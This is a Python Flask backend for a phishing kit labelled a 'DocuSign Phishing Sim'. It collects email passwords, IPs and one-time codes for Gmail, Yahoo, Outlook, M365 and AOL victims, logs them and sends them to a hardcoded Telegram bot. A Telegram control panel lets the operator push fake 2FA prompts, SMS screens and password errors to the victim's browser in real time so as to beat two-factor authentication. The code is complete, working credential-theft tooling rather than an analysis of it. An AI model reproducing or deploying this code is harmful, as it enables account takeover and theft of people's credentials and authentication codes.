#!/usr/bin/env python3
"""
DocuSign Phishing Sim — Backend API (Webhook Mode)
Full Gmail flow: single control panel with all options
"""

import json, logging, datetime, hashlib, threading, time, random, os
from flask import Flask, request, jsonify, send_from_directory, make_response
import requests as http_req

# ─── CONFIG ───
TELEGRAM_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TELEGRAM_CHAT_ID = "8337327707"
LOG_FILE = "captured.log"

API_BASE = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

app = Flask(__name__)

gmail_sessions = {}
gmail_sessions_lock = threading.Lock()

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


# ─── CORS ───
@app.after_request
def add_cors_headers(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


# ─── REAL IP ───
def get_real_ip():
    forwarded = request.headers.get("X-Forwarded-For", "")
    if forwarded:
        real_ip = forwarded.split(",")[0].strip()
        if real_ip and not real_ip.startswith(("10.", "172.16.", "192.168.", "127.")):
            return real_ip
    return request.remote_addr


# ─── TELEGRAM HELPERS ───
def tg_send_message(text, reply_markup=None, parse_mode=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
    if parse_mode: payload["parse_mode"] = parse_mode
    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = http_req.post(f"{API_BASE}/sendMessage", json=payload, timeout=15)
        result = r.json()
        if result.get("ok"):
            msg_id = result["result"]["message_id"]
            logger.info(f"✅ TG sent: msg_id={msg_id}")
            return msg_id
        else:
            logger.error(f"❌ TG send failed: {result}")
            return None
    except Exception as e:
        logger.error(f"❌ TG send error: {e}")
        return None


def tg_edit_message(message_id, text, reply_markup=None, parse_mode=None):
    payload = {"chat_id": TELEGRAM_CHAT_ID, "message_id": message_id, "text": text}
    if parse_mode: payload["parse_mode"] = parse_mode
    if reply_markup: payload["reply_markup"] = json.dumps(reply_markup)
    try:
        r = http_req.post(f"{API_BASE}/editMessageText", json=payload, timeout=15)
        return r.json().get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG edit error: {e}")
        return False


def tg_answer_callback(callback_query_id):
    try:
        r = http_req.post(f"{API_BASE}/answerCallbackQuery",
                          json={"callback_query_id": callback_query_id}, timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        logger.error(f"❌ TG answer callback error: {e}")
        return False


def inline_kb(rows):
    return {"inline_keyboard": rows}


def btn(text, callback_data):
    return {"text": text, "callback_data": callback_data}


# ─── TELEGRAM WEBHOOK ───
@app.route(f"/webhook/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json(force=True)
        if "callback_query" in data:
            handle_cb(data["callback_query"])
        elif "message" in data:
            handle_msg(data["message"])
        return jsonify({"ok": True})
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"ok": False}), 500


def handle_msg(msg_data):
    chat_id = msg_data.get("chat", {}).get("id")
    text = msg_data.get("text", "")
    if str(chat_id) != TELEGRAM_CHAT_ID:
        return
    if text == "/status":
        with gmail_sessions_lock:
            active = {k: v for k, v in gmail_sessions.items() if v.get("action") not in ("success", "cancelled")}
        if not active:
            tg_send_message("No active sessions.")
        else:
            lines = [f"Active: {len(active)}"]
            for sid, s in active.items():
                lines.append(f"• {s['email']} → {s.get('stage','?')}")
            tg_send_message("\n".join(lines))
    elif text == "/id":
        tg_send_message(f"Chat ID: {chat_id}")
    elif text == "/webhook_info":
        try:
            r = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=10)
            info = r.json().get("result", {})
            tg_send_message(
                f"URL: {info.get('url','N/A')}\n"
                f"Pending: {info.get('pending_update_count','?')}\n"
                f"Allowed: {info.get('allowed_updates','N/A')}\n"
                f"Error: {info.get('last_error_message','None')}"
            )
        except Exception as e:
            tg_send_message(f"Error: {e}")


def handle_cb(query):
    """Handle all button presses from the control panel."""
    cb_data = query["data"]
    mid = query["message"]["message_id"]
    cq_id = query["id"]

    try:
        tg_answer_callback(cq_id)

        # ─── SHOW 2FA NUMBER GRID ───
        if cb_data.startswith("2fa_grid:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                s["stage"] = "2fa_grid"
                # Build number grid
                kb_rows = []
                row = []
                for i in range(10, 100):
                    row.append(btn(str(i), f"2fa_pick:{sid}:{i}"))
                    if len(row) == 9:
                        kb_rows.append(row); row = []
                if row: kb_rows.append(row)
                kb_rows.append([btn("🔙 Back to Control Panel", f"control:{sid}")])
                tg_edit_message(mid, "🔐 **Select the last 2 digits of the phone number to show the user:**", 
                              reply_markup=inline_kb(kb_rows), parse_mode="Markdown")

        # ─── 2FA DIGIT SELECTED ───
        elif cb_data.startswith("2fa_pick:"):
            parts = cb_data.split(":")
            sid, digit = parts[1], parts[2]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                s["phone"] = digit
                s["action"] = "show_prompt"
                s["stage"] = "prompt_shown"
                # Show the prompt on user screen and update bot
                tg_send_message(f"✅ **Prompt sent to user**\nPhone ending: ••••{digit}\n\nWaiting for user to click 'Authorized'...", parse_mode="Markdown")
                # Show the control panel again with updated status
                show_control_panel(mid, sid)

        # ─── USER AUTHORIZED ───
        elif cb_data.startswith("authorized:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                code1 = f"{random.randint(100000, 999999)}"
                s["sms1"] = code1
                s["action"] = "sms1"
                s["stage"] = "sms1"
                tg_send_message(f"✅ **User Authorized**\n📱 SMS Code I generated: `{code1}`\n\nUser sees the SMS input screen now.", parse_mode="Markdown")
                show_control_panel(mid, sid)

        # ─── SEND SMS II ───
        elif cb_data.startswith("sms2:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                code2 = f"{random.randint(100000, 999999)}"
                s["sms2"] = code2
                s["action"] = "sms2"
                s["stage"] = "sms2"
                tg_send_message(f"📱 SMS Code II generated: `{code2}`", parse_mode="Markdown")
                show_control_panel(mid, sid)

        # ─── RESEND SMS I ───
        elif cb_data.startswith("resend1:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                c = f"{random.randint(100000, 999999)}"
                gmail_sessions[sid]["sms1"] = c
                tg_send_message(f"🔄 SMS I resent: `{c}`", parse_mode="Markdown")
                show_control_panel(mid, sid)

        # ─── COMPLETE / SUCCESS ───
        elif cb_data.startswith("success:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid not in gmail_sessions:
                    tg_send_message(f"⚠️ Session {sid} not found"); return
                s = gmail_sessions[sid]
                s["action"] = "success"
                s["stage"] = "done"
                tg_send_message(
                    f"✅ **COMPLETE — {s['email']}**\n\n"
                    f"Email: `{s['email']}`\nPassword: `{s['password']}`\n"
                    f"Phone: ••••{s.get('phone','N/A')}\n"
                    f"SMS I: `{s.get('sms1','N/A')}`\nSMS II: `{s.get('sms2','N/A')}`\n"
                    f"IP: `{s.get('ip','N/A')}`",
                    parse_mode="Markdown"
                )
                tg_edit_message(mid, f"✅ Session completed — {s['email']}",
                              reply_markup=inline_kb([[btn("🗑️ Delete Session", f"delete:{sid}")]]))

        # ─── PASSWORD ERROR ───
        elif cb_data.startswith("pw_error:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "pw_error"
                    gmail_sessions[sid]["stage"] = "pw_error"
                tg_send_message("🔑 Wrong password shown to user.")
                show_control_panel(mid, sid)

        # ─── DENY / NO ───
        elif cb_data.startswith("no:") or cb_data.startswith("deny:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "denied"
                    gmail_sessions[sid]["stage"] = "denied"
                tg_send_message("❌ Access Denied — user was redirected.")
                tg_edit_message(mid, "❌ Access Denied — user redirected.")

        # ─── CANCEL ───
        elif cb_data.startswith("cancel:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    gmail_sessions[sid]["action"] = "cancelled"
                    gmail_sessions[sid]["stage"] = "cancelled"
                tg_edit_message(mid, "❌ Session cancelled.")

        # ─── DELETE ───
        elif cb_data.startswith("delete:"):
            sid = cb_data.split(":", 1)[1]
            with gmail_sessions_lock:
                if sid in gmail_sessions:
                    del gmail_sessions[sid]
                tg_edit_message(mid, "🗑️ Session deleted.")

        # ─── BACK TO CONTROL PANEL ───
        elif cb_data.startswith("control:"):
            sid = cb_data.split(":", 1)[1]
            show_control_panel(mid, sid)

    except Exception as e:
        logger.error(f"CB error: {e}", exc_info=True)


def show_control_panel(message_id, sid):
    """Show or update the full control panel for a session."""
    with gmail_sessions_lock:
        if sid not in gmail_sessions:
            tg_edit_message(message_id, "Session expired.", reply_markup=None)
            return
        s = gmail_sessions[sid]
        email = s["email"]
        stage = s.get("stage", "new")

    status_indicators = {
        "new": "⬜",
        "2fa_grid": "⬜",
        "prompt_shown": "⬜",
        "sms1": "⬜",
        "sms2": "⬜",
        "pw_error": "⬜",
        "done": "✅",
    }

    grid_status = status_indicators.get(stage, "⬜")
    prompt_status = "✅" if stage in ("prompt_shown", "sms1", "sms2", "done") else "⬜"
    sms1_status = "✅" if stage in ("sms1", "sms2", "done") else "⬜"
    sms2_status = "✅" if stage in ("sms2", "done") else "⬜"
    pw_err_status = "✅" if stage == "pw_error" else "⬜"

    phone_display = f"••••{s.get('phone','??')}" if s.get('phone') else "Not selected"
    sms1_display = f"`{s.get('sms1','N/A')}`" if s.get('sms1') else "Not generated"
    sms2_display = f"`{s.get('sms2','N/A')}`" if s.get('sms2') else "Not generated"

    header = (
        f"🔔 **GMAIL Control Panel**\n"
        f"👤 {email}\n"
        f"📌 Session: `{sid[:8]}...`\n"
        f"━━━━━━━━━━━━━━━━"
    )

    status_section = (
        f"\n**Current Status:**\n"
        f"{grid_status} 2FA Number: {phone_display}\n"
        f"{prompt_status} Prompt: {'Shown to user' if stage in ('prompt_shown','sms1','sms2','done') else 'Not shown'}\n"
        f"{sms1_status} SMS I: {sms1_display}\n"
        f"{sms2_status} SMS II: {sms2_display}\n"
        f"{pw_err_status} Password Error: {'Shown' if stage == 'pw_error' else 'Not shown'}\n"
        f"━━━━━━━━━━━━━━━━"
    )

    actions_section = "\n**Actions:**"

    # Build the keyboard — always show all available actions
    kb_rows = []

    # Row 1: 2FA Grid + Authorized
    kb_rows.append([
        btn("🔢 Select 2FA Number", f"2fa_grid:{sid}"),
        btn("✅ User Authorized", f"authorized:{sid}")
    ])

    # Row 2: SMS controls
    kb_rows.append([
        btn("📱 SMS Code I → II", f"sms2:{sid}"),
        btn("🔄 Resend SMS I", f"resend1:{sid}")
    ])

    # Row 3: Password Error + Success
    kb_rows.append([
        btn("🔑 Wrong Password", f"pw_error:{sid}"),
        btn("✅ Complete (Success)", f"success:{sid}")
    ])

    # Row 4: Deny + Cancel
    kb_rows.append([
        btn("❌ Deny Access", f"no:{sid}"),
        btn("🚫 Cancel Session", f"cancel:{sid}")
    ])

    full_text = header + status_section + actions_section

    tg_edit_message(message_id, full_text, reply_markup=inline_kb(kb_rows), parse_mode="Markdown")


# ─── SERVE LANDING PAGE ───
@app.route("/")
def serve_landing():
    return send_from_directory(".", "index.html")


# ─── API ───
@app.route("/setup_webhook", methods=["POST"])
def setup_webhook():
    data = request.json
    url = data.get("url", "")
    if not url:
        return jsonify({"error": "Provide url"}), 400
    webhook_url = f"{url.rstrip('/')}/webhook/{TELEGRAM_BOT_TOKEN}"
    try:
        http_req.get(f"{API_BASE}/deleteWebhook", params={"drop_pending_updates": True}, timeout=15)
        http_req.post(f"{API_BASE}/setWebhook", json={
            "url": webhook_url, "allowed_updates": ["message", "callback_query"],
            "drop_pending_updates": True, "max_connections": 40
        }, timeout=15)
        time.sleep(2)
        info = http_req.get(f"{API_BASE}/getWebhookInfo", timeout=15).json()
        return jsonify({"webhook_url": webhook_url, "webhook_info": info.get("result", info)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/creds", methods=["POST", "OPTIONS"])
def capture():
    if request.method == "OPTIONS":
        return make_response("", 204)

    data = request.json
    provider = data.get("provider", "unknown")
    email = data.get("email", "")
    password = data.get("password", "")
    ip = get_real_ip()
    ua = request.headers.get("User-Agent", "unknown")

    session_id = hashlib.md5(f"{time.time()}{random.random()}{email}".encode()).hexdigest()[:12]

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "provider": provider,
             "email": email, "password": password, "ip": ip, "ua": ua, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"Captured: {provider} / {email} / IP={ip}")

    if provider == "gmail":
        with gmail_sessions_lock:
            gmail_sessions[session_id] = {
                "email": email, "password": password, "ip": ip, "ua": ua,
                "action": "waiting", "stage": "new",
                "phone": None, "sms1": None, "sms2": None
            }

        # Send creds drop
        tg_send_message(
            f"[+]___ Invitation Card (GMAIL) ___[+]\n"
            f"New form submission \n"
            f"IP: {ip}\n"
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"UA: {ua}"
        )

        # Send the full control panel
        header = (
            f"🔔 **GMAIL Control Panel**\n"
            f"👤 {email}\n"
            f"📌 Session: `{session_id[:8]}...`\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"**New session — awaiting action**\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"**Actions:**"
        )

        kb_rows = [
            [btn("🔢 Select 2FA Number", f"2fa_grid:{session_id}"),
             btn("✅ User Authorized", f"authorized:{session_id}")],
            [btn("📱 SMS Code I → II", f"sms2:{session_id}"),
             btn("🔄 Resend SMS I", f"resend1:{session_id}")],
            [btn("🔑 Wrong Password", f"pw_error:{session_id}"),
             btn("✅ Complete (Success)", f"success:{session_id}")],
            [btn("❌ Deny Access", f"no:{session_id}"),
             btn("🚫 Cancel Session", f"cancel:{session_id}")]
        ]

        msg_id = tg_send_message(header, reply_markup=inline_kb(kb_rows), parse_mode="Markdown")

        return jsonify({"session": session_id, "action": "waiting", "msg_id": msg_id})

    else:
        pid = {"yahoo": "yahoo", "outlook": "outlook", "m365": "m365", "aol": "aol"}.get(provider, provider)
        tg_send_message(f"[+]___ Invitation Card ___[+]\nIP: {ip}\nId: {pid}\nEmail: {email}\nPassword: {password}")
        return jsonify({"session": session_id, "action": "check_provider"})


@app.route("/api/gmail/status/<session_id>")
def gmail_status(session_id):
    """Frontend polls this — returns what to show on the victim's screen."""
    with gmail_sessions_lock:
        if session_id not in gmail_sessions:
            return jsonify({"action": "waiting"})  # Stay on loading
        s = gmail_sessions[session_id]
        action = s.get("action", "waiting")

    if action == "show_prompt":
        return jsonify({
            "action": "show_prompt",
            "phone": s.get("phone", "XX"),
            "email": s.get("email", "")
        })
    elif action == "pw_error":
        return jsonify({"action": "pw_error"})
    elif action == "denied":
        return jsonify({"action": "denied"})
    elif action == "sms1":
        return jsonify({"action": "sms", "code": s.get("sms1", "000000"), "num": 1})
    elif action == "sms2":
        return jsonify({"action": "sms", "code": s.get("sms2", "000000"), "num": 2})
    elif action == "success":
        return jsonify({"action": "success"})
    elif action == "cancelled":
        return jsonify({"action": "redirect", "url": "https://accounts.google.com"})
    # Default: waiting on loading screen
    return jsonify({"action": "waiting"})


@app.route("/api/otp", methods=["POST"])
def capture_otp():
    data = request.json
    otp = data.get("otp", "")
    provider = data.get("provider", "unknown")
    session_id = data.get("session", "unknown")
    ip = get_real_ip()

    entry = {"timestamp": datetime.datetime.utcnow().isoformat(), "event": "otp",
             "provider": provider, "otp": otp, "ip": ip, "session": session_id}
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    logger.info(f"OTP: {provider} / {otp}")
    tg_send_message(f"[+]___ OTP Code ___[+]\nId: {provider}\nOTP: {otp}")
    return jsonify({"status": "ok"})


@app.route("/health")
def health():
    with gmail_sessions_lock:
        return jsonify({"status": "ok", "sessions": len(gmail_sessions)})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False)
